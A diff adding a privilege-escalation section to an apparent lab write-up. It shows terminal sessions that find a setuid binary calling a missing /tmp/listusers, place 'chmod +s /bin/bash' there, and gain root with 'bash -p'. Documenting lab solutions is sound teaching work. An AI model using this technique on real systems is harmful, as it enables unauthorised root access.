@@ -52,6 +52,86 @@ nmap script payload.
 
 ## Privilege Escalation
 
+```
+ircd@irked:/tmp$ find / -perm -u=s -type f 2>/dev/null
+[***]
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/X
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount
+/bin/fusermount
+/bin/ntfs-3g
+/bin/umount
+ircd@irked:/tmp$
+```
+checking for suid, we can see an suid bin `/usr/bin/viewuser`. let's check out what this bin does. 
+
+```
+ircd@irked:/tmp$ file /usr/bin/viewuser
+/usr/bin/viewuser: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID
+[sha1]=69ba4bc75bf72037f1ec492bc4cde2550eeac4bb, not stripped
+ircd@irked:/tmp$ strings /usr/bin/viewuser
+/lib/ld-linux.so.2   
+libc.so.6
+_IO_stdin_used       
+setuid                     
+puts        
+system         
+__cxa_finalize   
+__libc_start_main
+GLIBC_2.0   
+GLIBC_2.1.3      
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+UWVS
+[^_]
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+/tmp/listusers
+;*2$"
+GCC: (Debian 7.2.0-8) 7.2.0
+crtstuff.c
+deregister_tm_clones
+[***]
+ircd@irked:/tmp$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-06-05 21:21 (:0)
+djmardov pts/1        2023-06-06 04:40 (10.10.14.16)
+sh: 1: /tmp/listusers: not found
+```
+we can see it calls a bin `/tmp/listusers` which is not available. let's tak advantag of this.
+
+```
+ircd@irked:/tmp$ touch listusers
+ircd@irked:/tmp$ nano listusers 
+ircd@irked:/tmp$ cat listusers 
+bash -c "chmod +s /bin/bash"
+ircd@irked:/tmp$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2023-06-05 21:21 (:0)
+djmardov pts/1        2023-06-06 04:40 (10.10.14.16)
+ircd@irked:/tmp$ /bin/bash -p
+bash-4.3# id
+uid=1001(ircd) gid=1001(ircd) euid=0(root) egid=0(root) groups=0(root),1001(ircd)
+bash-4.3# 
+```
+created an suid bin inside the `listusers` file running it gave us bash suid. then `bash -p` brought the root shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/362ad8e1-b4a6-4ddb-b032-848eead76d07)
+
+and we are through.
+
+
 
 
 
